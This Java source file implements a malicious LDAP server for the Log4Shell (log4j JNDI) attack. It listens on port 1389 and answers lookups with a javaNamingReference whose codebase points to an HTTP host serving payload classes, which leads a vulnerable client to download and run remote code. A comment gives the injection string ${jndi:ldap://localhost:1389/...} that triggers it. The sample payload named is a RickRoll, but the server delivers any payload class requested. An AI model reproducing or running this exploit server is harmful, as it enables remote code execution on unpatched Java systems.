package itzbenz;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.directory.InitialDirContext;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPServer extends InMemoryOperationInterceptor {


    public String host = "http://" + Main.address + ":" + Main.port + "/";

    //to test thing
    public static void main(String[] args) {
        InitialDirContext idc = null;
        //false positive check
        if (LDAPServer.class.getClassLoader().getResource(Main.defaultPayload.replace('.', '/') + ".class") != null) {
            throw new RuntimeException("payload already exists in current classloader");
        }
        try {
            idc = new InitialDirContext();
            //log4j: ${jndi:ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll}
            Object o = idc.lookup("ldap://localhost:1389/o=reference,payload=itzbenz.payload.RickRoll");
            System.out.println(o);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void start() throws Exception {
        System.out.println("Starting LDAP server on 0.0.0.0:1389");
        InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        inMemoryOperationInterceptor.addInMemoryOperationInterceptor(this);
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(inMemoryOperationInterceptor);
        ds.startListening();

    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        String payload = base.split(",")[1].split("=")[1];
        System.out.println();
        System.out.println("[+] Requested Payload: " + payload);
        if (!Main.payloadExists(payload))
            payload = Main.defaultPayload;
        String className = payload.split("\\.")[payload.split("\\.").length - 1];
        Entry e = new Entry(base);
        System.out.println("Sending LDAP reference result for " + host + payload.replace('.', '/') + ".class");
        e.addAttribute("objectClass", "javaNamingReference");//cool
        e.addAttribute("javaClassName", payload); //unknown if fail
        e.addAttribute("javaFactory", payload); //magic payload
        e.addAttribute("javaCodeBase", host);
        try {
            result.sendSearchEntry(e);//uncool
        } catch (LDAPException ex) {
            ex.printStackTrace();
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));//great success
    }


}
